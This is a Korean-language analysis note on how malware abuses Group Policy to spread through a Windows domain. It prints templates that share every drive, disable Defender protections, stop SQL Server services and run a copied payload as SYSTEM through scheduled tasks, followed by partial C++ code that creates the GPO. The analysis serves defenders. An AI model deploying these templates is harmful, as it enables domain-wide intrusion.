#com 
## Create GPO
### Concept

악성 코드는 gpo를 사용해 악성 코드를 유포하려고 함.
NetworkShares.xml를 통해 드라이브 공유.
Registry.pol로 레지스트리를 설정.
Files.xml, ScheduledTasks.xml로 파일을 유포함.

### Code Flow

1. IGroupPolicyObject::New 메서드를 사용하여 GPO 객체를 가져옴
2. CreateGPOLink API를 사용하여 GPO와 도메인의 ADs와 연결
3. gPCMachineExtensionNames, versionNumber 설정
4. GPT.INI 파일 생성
5. NetworkShares.xml 파일 생성
6. Registry.pol 파일 생성
7. comment.cmtx 파일 생성
8. Services.xml 파일 생성
9. Files.xml 파일 생성
10. ScheduledTasks.xml 파일 생성

### Group Policy Object, GPO

#### gPCMachineExtensionNames

[MSDN-gPCMachineExtensionNames](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpod/896f59a5-5b72-4fb5-b1d4-8d007fdd6cb3)

`gPCMachineExtensionNames` 속성은 그룹 정책 객체(GPO)에 대한 컴퓨터 정책을 사용하는 데 사용.
- 이 속성은 GPO가 업데이트될 때마다 업데이트.
- GPO 확장에 대한 고유 식별자(GUID)를 나타냄.
- 각 대괄호 안에 있는 두 개의 GUID는 클라이언트 측 확장(CSE)과 관리 도구 확장을 나타냄.
- 이들은 그룹 정책 설정을 적용하고 편집하는 데 사용됨.
- `[{Client-Side Extension} {Admin Tool Extension}]` 형식을 따름.

`{00000000-0000-0000-0000-000000000000}` = Core GPO Engine
`{3BAE7E51-E3F4-41D0-853D-9BB9FD47605F}` = Preference Tool CSE GUID Files
`{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}` = Preference Tool CSE GUID Scheduled Tasks

`{7150F9BF-48AD-4DA4-A49C-29EF4A8369BA}` = Preference CSE GUID Files
`{3BAE7E51-E3F4-41D0-853D-9BB9FD47605F}` = Preference Tool CSE GUID Files

`{AADCED64-746C-4633-A97C-D61349046527}` = Preference CSE GUID Scheduled Tasks
`{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}` = Preference Tool CSE GUID Scheduled Tasks

```
[{00000000-0000-0000-0000-000000000000}{3BAE7E51-E3F4-41D0-853D-9BB9FD47605F}{CAB54552-DEEA-4691- 817E-ED4A4D1AFC72}][{7150F9BF-48AD-4DA4-A49C-29EF4A8369BA}{3BAE7E51-E3F4-41D0-853D-9BB9FD47605F}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]
```

#### (gpo_sys_path)\\GPT.INI

`GPT.INI` 파일은 그룹 정책 객체 (Group Policy Object, GPO)의 버전 정보를 저장하는 데 사용됨.

이 파일은 그룹 정책이 적용되는 도메인 컨트롤러와 클라이언트 시스템에 모두 존재함.

`GPT.INI` 파일은 그룹 정책이 변경될 때마다 업데이트되며, 이를 통해 클라이언트 시스템이 그룹 정책의 최신 버전을 알 수 있음.

클라이언트 시스템은 로컬 `GPT.INI` 파일의 버전 정보와 도메인 컨트롤러의 `GPT.INI` 파일의 버전 정보를 비교하여 그룹 정책이 변경되었는지 확인함.

그룹 정책이 변경되었다면, 클라이언트 시스템은 새로운 그룹 정책 설정을 다운로드하고 적용.

```ini
[General]
Version=2621892
displayName=(gpo_display_name)
```

#### (gpo_sys_path)\\Preferences\\NetworkShares\\NetworkShares.xml

그룹 정책 객체 (Group Policy Object, GPO)의 일부로, 네트워크 공유 설정을 저장하는 데 사용됨.

`<NetworkShareSettings clsid="{520870D8-A6E7-47e8-A8D8-E6A4E76EAEC2}">`
- `NetShare` 요소를 포함하며, 각 `NetShare` 요소는 특정 네트워크 공유를 나타냄.

`<NetShare clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}" image="2" name="%%ComputerName%%_D" changed="%s" uid="%s">`
- `%%ComputerName%%_D`라는 이름의 네트워크 공유를 나타냄.
- `clsid` 속성은 공유의 클래스 식별자를 나타냄.
- `image` 속성은 공유의 이미지 번호를 나타냄.
- `changed` 속성은 공유가 마지막으로 변경된 시간을 나타냄.
- `uid` 속성은 공유의 고유 식별자를 나타냄.

`<Properties action="U" name="%%ComputerName%%_D" path="D:" comment="" allRegular="0" allHidden="0" allAdminDrive="0" limitUsers="NO_CHANGE" abe="NO_CHANGE" />`
- 이 요소는 네트워크 공유의 설정을 정의함.
- `action` 속성은 공유의 동작을 나타냄.
- `name` 속성은 공유의 이름을 나타냄.
- `path` 속성은 공유의 경로를 나타냄.
- `comment` 속성은 공유에 대한 설명을 나타냄.
- `allRegular`, `allHidden`, `allAdminDrive` 속성은 공유의 접근 권한을 나타냄.
- `limitUsers` 속성은 공유에 동시에 접속할 수 있는 사용자 수를 제한하는 설정을 나타냄.
- `abe` 속성은 액세스 기반 열거 (Access-Based Enumeration, ABE) 설정을 나타냄.

그룹 정책을 통해 네트워크 공유 설정을 관리하는 데 사용됨.
이 설정은 그룹 정책이 적용될 때 해당 설정을 읽어서 적절한 네트워크 공유 구성을 적용하는 데 사용됨.

```xml
<?xml version="1.0" encoding="utf-8"?>
<NetworkShareSettings
	clsid="{520870D8-A6E7-47e8-A8D8-E6A4E76EAEC2}">
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_D"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_D"
			path="D:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_E"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_E"
			path="E:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE" abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_F"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_F"
			path="F:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_G"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_G"
			path="G:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_H"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_H"
			path="H:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_I"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_I"
			path="I:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_J"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_J"
			path="J:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_K"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_K"
			path="K:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_L"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_L"
			path="L:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
	    clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
	    image="2"
	    name="%%ComputerName%%_M"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_M"
			path="M:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_N"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_N"
			path="N:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_O"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_O"
			path="O:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_P"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_P"
			path="P:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_Q"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_Q"
			path="Q:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
	<NetShare
		clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
		image="2"
		name="%%ComputerName%%_R"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_R"
			path="R:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
	</NetShare>
    <NetShare
	    clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
	    image="2"
	    name="%%ComputerName%%_S"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_S"
			path="S:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
    </NetShare>
    <NetShare
	    clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
	    image="2"
	    name="%%ComputerName%%_T"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_T"
			path="T:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE" abe="NO_CHANGE" />
    </NetShare>
    <NetShare
        clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
        image="2"
        name="%%ComputerName%%_U"
		changed="%s"
		uid="%s">
		<Properties
		    action="U"
		    name="%%ComputerName%%_U"
		    path="U:"
		    comment=""
		    allRegular="0"
		    allHidden="0"
		    allAdminDrive="0"
		    limitUsers="NO_CHANGE"
		    abe="NO_CHANGE" />
    </NetShare>
    <NetShare
        clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
        image="2"
        name="%%ComputerName%%_V"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_V"
			path="V:"
			comment=""
			allRegular="0"
            allHidden="0"
            allAdminDrive="0"
            limitUsers="NO_CHANGE"
            abe="NO_CHANGE" />
    </NetShare>
    <NetShare
	    clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
	    image="2"
	    name="%%ComputerName%%_W"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_W"
			path="W:"
			comment=""
			allRegular="0"
            allHidden="0"
            allAdminDrive="0"
            limitUsers="NO_CHANGE"
            abe="NO_CHANGE" />
    </NetShare>
    <NetShare
	    clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
	    image="2"
	    name="%%ComputerName%%_X"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_X"
			path="X:"
			comment=""
			allRegular="0"
            allHidden="0"
            allAdminDrive="0"
            limitUsers="NO_CHANGE"
            abe="NO_CHANGE" />
    </NetShare>
    <NetShare
	    clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
	    image="2"
	    name="%%ComputerName%%_Y"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_Y"
			path="Y:"
			comment=""
			allRegular="0"
            allHidden="0"
            allAdminDrive="0"
            limitUsers="NO_CHANGE"
            abe="NO_CHANGE" />
    </NetShare>
    <NetShare
        clsid="{2888C5E7-94FC-4739-90AA-2C1536D68BC0}"
        image="2"
        name="%%ComputerName%%_Z"
		changed="%s"
		uid="%s">
		<Properties
			action="U"
			name="%%ComputerName%%_Z"
			path="Z:"
			comment=""
			allRegular="0"
			allHidden="0"
			allAdminDrive="0"
			limitUsers="NO_CHANGE"
			abe="NO_CHANGE" />
    </NetShare>
</NetworkShareSettings>
```

#### (gpo_sys_path)\\Registry.pol

윈도우 레지스트리 키와 그에 해당하는 값을 나타냄.
각 키는 특정 그룹 정책 설정을 나타내며, 값은 해당 설정의 상태를 나타냄.

1. `[SOFTWARE\Policies\Microsoft\Windows\System;GroupPolicyRefreshTimeDC;;;;]`
	- 도메인 컨트롤러에서 그룹 정책을 새로 고침하는 데 필요한 시간을 설정.
2. `[SOFTWARE\Policies\Microsoft\Windows\System;GroupPolicyRefreshTimeOffsetDC;;;;]`
	- 도메인 컨트롤러에서 그룹 정책을 새로 고침하는 데 필요한 시간의 오프셋을 설정.
3. `[SOFTWARE\Policies\Microsoft\Windows\System;GroupPolicyRefreshTime;;;;]`
	- 그룹 정책을 새로 고침하는 데 필요한 시간을 설정.
4. `[SOFTWARE\Policies\Microsoft\Windows\System;GroupPolicyRefreshTimeOffset;;;;]`
	- 그룹 정책을 새로 고침하는 데 필요한 시간의 오프셋을 설정.
5. `[SOFTWARE\Policies\Microsoft\Windows\System;EnableSmartScreen;;;;]`
	- 스마트 스크린 기능을 활성화 또는 비활성화.
6. `[SOFTWARE\Policies\Microsoft\Windows\System;delShellSmartScreenLevel;;;;]`
	- 스마트 스크린 레벨을 설정.
7. `[SOFTWARE\Policies\Microsoft\Windows Defender;DisableAntiSpyware;;;;]`
	- 안티스파이웨어 기능을 비활성화.
8. `[SOFTWARE\Policies\Microsoft\Windows Defender;DisableRoutinelyTakingAction;;;;]`
	- 일반적으로 수행하는 작업을 비활성화.
9. `[SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection;DisableRealtimeMonitoring;;;;]`
	- 실시간 모니터링을 비활성화.
10. `[SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection;DisableBehaviorMonitoring;;;;]`
	- 행동 모니터링을 비활성화.
11. `[SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet;SubmitSamplesConsent;;;;]`
	- 샘플 제출 동의를 설정.
12. `[SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet;SpyNetReporting;;;;]`
	- SpyNet 보고를 설정.
13. `[SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile;EnableFirewall;;;;]`
	- 도메인 프로필에 대한 방화벽을 활성화.
14. `[SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile;EnableFirewall;;;;]`
	- 표준 프로필에 대한 방화벽을 활성화.

```
PReg
[SOFTWARE\Policies\Microsoft\Windows\System;GroupPolicyRefreshTimeDC;;;;][SOFTWARE\Policies\Microsoft\Windows\System;GroupPolicyRefreshTimeOffsetDC;;;;][SOFTWARE\Policies\Microsoft\Windows\System;GroupPolicyRefreshTime;;;;][SOFTWARE\Policies\Microsoft\Windows\System;GroupPolicyRefreshTimeOffset;;;;][SOFTWARE\Policies\Microsoft\Windows\System;EnableSmartScreen;;;;][SOFTWARE\Policies\Microsoft\Windows\System;delShellSmartScreenLevel;;;;]
[SOFTWARE\Policies\Microsoft\Windows Defender;DisableAntiSpyware;;;;]
[SOFTWARE\Policies\Microsoft\Windows Defender;DisableRoutinelyTakingAction;;;;]
[SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection;DisableRealtimeMonitoring;;;;][SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection;DisableBehaviorMonitoring;;;;][SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet;SubmitSamplesConsent;;;;]
[SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet;SpyNetReporting;;;;][SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile;EnableFirewall;;;;][SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile;EnableFirewall;;;;]

```

#### (gpo_sys_path)\\comment.cmtx

```xml
<?xml version='1.0' encoding='utf-8'?>
<policyComments
	xmlns:xsd="http://www.w3.org/2001/XMLSchema"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	revision="1.0"
	schemaVersion="1.0"
	xmlns="http://www.microsoft.com/GroupPolicy/CommentDefinitions">
    <policyNamespaces>
	    <using prefix="ns0" namespace="Microsoft.Policies.GroupPolicy"></using>
	    <using prefix="ns1" namespace="Microsoft.Policies.SmartScreen"></using>
	    <using prefix="ns2" namespace="Microsoft.Policies.WindowsDefender"></using>
	    <using prefix="ns3" namespace="Microsoft.Policies.WindowsFirewall"></using>
    </policyNamespaces>
    <comments>
	    <admTemplate></admTemplate>
    </comments>
    <resources minRequiredRevision="1.0">
	    <stringTable></stringTable>
    </resources>
</policyComments>
```

#### (gpo_sys_path)\\Preferences\\Services\\Services.xml

`<NTServices clsid="{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}">`
- 이 요소는 여러 `NTService` 요소를 포함하며, 각 `NTService` 요소는 특정 서비스를 나타냄.

`<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}" name="SQLPBDMS" image="4" changed="%s" uid="%s" disabled="0">`
- 이 요소는 `SQLPBDMS`라는 이름의 서비스를 나타냄.
- `clsid` 속성은 서비스의 클래스 식별자를 나타냄.
- `image` 속성은 서비스의 이미지 번호를 나타냄.
- `changed` 속성은 서비스가 마지막으로 변경된 시간을 나타냄.
- `uid` 속성은 서비스의 고유 식별자를 나타냄.
- `disabled` 속성은 서비스가 비활성화되었는지 여부를 나타냄.

`<Properties startupType="DISABLED" serviceName="SQLPBDMS" serviceAction="STOP" timeout="30" />`
- 이 요소는 서비스의 설정을 정의함.
- `startupType` 속성은 서비스의 시작 유형을 나타냄.
- `serviceName` 속성은 서비스의 이름을 나타냄. 
- `serviceAction` 속성은 서비스 액션을 나타냄,
- `timeout` 속성은 타임아웃 시간을 나타냄.

```xml
<?xml version="1.0" encoding="utf-8"?>
<NTServices
	clsid="{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}">
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="SQLPBDMS"
		image="4"
		changed="%s"
	    uid="%s"
	    disabled="0">
        <Properties
		    startupType="DISABLED"
		    serviceName="SQLPBDMS"
		    serviceAction="STOP"
		    timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="SQLPBENGINE"
        image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="SQLPBENGINE"
			serviceAction="STOP"
			timeout="30" />
    </NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="MSSQLFDLauncher"
		image="4"
		changed="%s"
		uid="%s"
		userContext="0"
		removePolicy="0"
		disabled="0">
        <Properties
			startupType="DISABLED"
			serviceName="MSSQLFDLauncher"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="SQLSERVERAGENT"
		image="4"
		changed="%s" uid="%s" disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="SQLSERVERAGENT"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="MSSQLServerOLAPService"
		image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="MSSQLServerOLAPService"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="SSASTELEMETRY"
		image="4"
		changed="%s" uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="SSASTELEMETRY"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="SQLBrowser"
		image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="SQLBrowser"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="SQL Server Distributed Replay Client"
		image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="SQL Server Distributed Replay Client"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="SQL Server Distributed Replay Controller"
		image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="SQL Server Distributed Replay Controller"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="MsDtsServer150"
		image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="MsDtsServer150"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="SSISTELEMETRY150"
		image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="SSISTELEMETRY150"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="SSISScaleOutMaster150"
		image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="SSISScaleOutMaster150"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="SSISScaleOutWorker150"
		image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="SSISScaleOutWorker150"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="MSSQLLaunchpad"
		image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="MSSQLLaunchpad"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="SQLWriter"
		image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="SQLWriter"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="SQLTELEMETRY"
		image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="SQLTELEMETRY"
			serviceAction="STOP"
			timeout="30" />
	</NTService>
	<NTService
		clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}"
		name="MSSQLSERVER"
		image="4"
		changed="%s"
		uid="%s"
		disabled="0">
		<Properties
			startupType="DISABLED"
			serviceName="MSSQLSERVER"
			serviceAction="STOP"
			timeout="60" />
	</NTService>
</NTServices>
```

#### (gpo_sys_path)\\Preferences\\Files\\Files.xml


```xml
<?xml version="1.0" encoding="utf-8"?>
<Files clsid="{215B2E53-57CE-475c-80FE-9EEC14635851}">
	<File clsid="{50BE44C8-567A-4ed1-B1D0-9234FE1F38AF}" name="(id)" status="(id)" image="2" bypassErrors="1"
		changed="(system time)" uid="%s">
		<Properties action="U" fromPath="(source path)" targetPath="(target path)" readOnly="0" archive="1"
			hidden="0" suppress="0"/>
	</File>
</Files>
```

#### (gpo_sys_path)\\Preferences\\ScheduledTasks\\ScheduledTasks.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
	<TaskV2 clsid="{D8896631-B747-47a7-84A6-C155337F3BC8}" name="(id)" image="2" changed="(system time)" uid="(guid)">
		<Properties action="U" name="(id)" runAs="(NT AUTHORITY\SYSTEM)" logonType="InteractiveToken">
			<Task version="1.2">
				<RegistrationInfo>
					<Author>(NT AUTHORITY\SYSTEM)</Author>
					<Description></Description>
				</RegistrationInfo>
				<Principals>
					<Principal id="Author">
						<UserId>(NT AUTHORITY\SYSTEM)</UserId>
						<LogonType>InteractiveToken</LogonType>
						<RunLevel>HighestAvailable</RunLevel>
					</Principal>
				</Principals>
				<Settings>
					<IdleSettings>
						<Duration>PT10M</Duration>
						<WaitTimeout>PT1H</WaitTimeout>
						<StopOnIdleEnd>false</StopOnIdleEnd>
						<RestartOnIdle>false</RestartOnIdle>
					</IdleSettings>
					<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
					<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
					<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
					<AllowHardTerminate>true</AllowHardTerminate>
					<AllowStartOnDemand>true</AllowStartOnDemand>
					<Enabled>true</Enabled><Hidden>false</Hidden>
					<ExecutionTimeLimit>P3D</ExecutionTimeLimit>
					<Priority>7</Priority>
				</Settings>
				<Triggers>
					<RegistrationTrigger>
						<Enabled>true</Enabled>
					</RegistrationTrigger>
				</Triggers>
				<Actions Context="Author">
					<Exec>
						<Command>(target path)</Command>
						<Arguments>(args)</Arguments>
					</Exec>
				</Actions>
			</Task>
		</Properties>
	</TaskV2>
</ScheduledTasks>
```


### Example

```c++
DsGetDcNameW(0x0, 0x0, 0x0, 0x0, 0x0, &p_dci);
wcscpy(domain_name, p_dci->DomainName);
NetApiBufferFree(p_dci);

p_find = wcsrchr(domain_name, L'.');
*p_find = 0x0;
domain_name_part2 = p_find + 1;
domain_name_part1 = domain_name;

CoInitialize(0x0);
// CLSID_Group Policy Object = {EA502722-A23D-11D1-A7D3-0000F87571E3}
// IID_IGroupPolicyObject = {EA502723-A23D-11D1-A7D3-0000F87571E3}
CoCreateInstance(clsid_GroupPolicyObject, 0x0, 0x1, iid_IGroupPolicyObject, &p_IGroupPolicyObject);
swprintf(gpo_path, "LDAP://%s/DC=%s,DC=%s", domain_name, domain_name_part1, domain_name_part2);
p_IGroupPolicyObject->New(p_IGroupPolicyObject, gpo_path, "example_gpo", 0x0);
p_IGroupPolicyObject->GetName(p_IGroupPolicyObject, computer_name, 0x100);
swprintf(ads_path, "LDAP://DC=%s,DC=%s", domain_name_part1, domain_name_part2);
swprintf(gpo_path, "LDAP://CN=%s,CN=Policies,CN=System,DC=%s,DC=%s", computer_name, domain_name_part1, domain_name_part2);
CreateGPOLink(gpo_path, ads_path,0x1);

// IID_IADs = {FD8256D0-FD15-11CE-ABC4-02608C9E7553}
ADsGetObject(gpo_path, iid_IADs, &p_IADs);
pc_machine_extension_names = "[{00000000-0000-0000-0000-000000000000}{3BAE7E51-E3F4-41D0-853D-9BB9FD47605F}{CAB54552-DEEA-4691- 817E-ED4A4D1AFC72}][{7150F9BF-48AD-4DA4-A49C-29EF4A8369BA}{3BAE7E51-E3F4-41D0-853D-9BB9FD47605F}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]";
p_IADs->Put(p_IADs, "gPCMachineExtensionNames", pc_machine_extension_names);
p_IADs->Put(p_IADs, "versionNumber", "2621892");
p_IADs->SetSysInfo(p_IADs);

p_IGroupPolicyObject->GetFileSysPath(p_IGroupPolicyObject, GPO_SECTION_ROOT, gpo_root_path, 0x400);
path = gpo_root_path;
PathAppendW(path, "GPT.INI");
h_file = CreateFileW(path, 0x40000000, 0x0, 0x0, 0x4, 0x80, 0x0);

p_IGroupPolicyObject->GetFileSysPath(p_IGroupPolicyObject, GPO_SECTION_MACHINE, gpo_machine_path, 0x400);
path = gpo_machine_path;
PathAppendW(path, "Preferences\\NetworkShares");
CreateDirectoryW(path, 0x0);
PathAppendW(path, "NetworkShares.xml");
